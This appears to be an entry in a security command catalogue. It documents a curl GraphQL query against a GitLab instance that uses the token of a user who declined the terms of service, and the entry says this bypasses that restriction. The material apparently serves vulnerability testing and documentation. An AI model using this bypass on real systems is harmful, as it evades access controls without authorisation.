---
data: >-
  curl 'https://gitlab.domain.com/api/graphql' -H 'Content-Type:
  application/json' -H 'Authorization: Bearer <TOKEN>' --data '{"query":"query
  {\n currentUser {\n id\n username\n name\n }\n}\n"}'
tags:
  - graphql
  - tos
type: command
output: >-
  {"data":{"currentUser":{"id":"gid://gitlab/User/61","username":"unwilling","name":"Unwilling
  User"}}}
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:59.457Z'
id: 30b98826-9e3f-4098-8e51-6007c1a7d46c
verified: false
validated: true
submitted: true
---
# curl-graphql-tos-bypass-query

## Command

```bash
curl 'https://gitlab.domain.com/api/graphql' -H 'Content-Type: application/json' -H 'Authorization: Bearer <TOKEN>' --data '{"query":"query {\n currentUser {\n id\n username\n name\n }\n}\n"}'
```

## Description

Queries current user details via GraphQL with a token from a user who declined ToS, bypassing the restriction.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--data` | Query for user fields | Yes |
| `-H 'Authorization: Bearer <TOKEN>'` | Restricted token | Yes |

## Examples

### Basic Usage

```bash
curl 'https://gitlab.domain.com/api/graphql' -H 'Content-Type: application/json' -H 'Authorization: Bearer <TOKEN>' --data '{"query":"query {\n currentUser {\n id\n username\n name\n }\n}\n"}'
```

## Expected Output

User details JSON.

## Related

- [[commands/curl-rest-tos-block]]
- [[procedures/Bypass-Additional-Restrictions-via-GraphQL]]
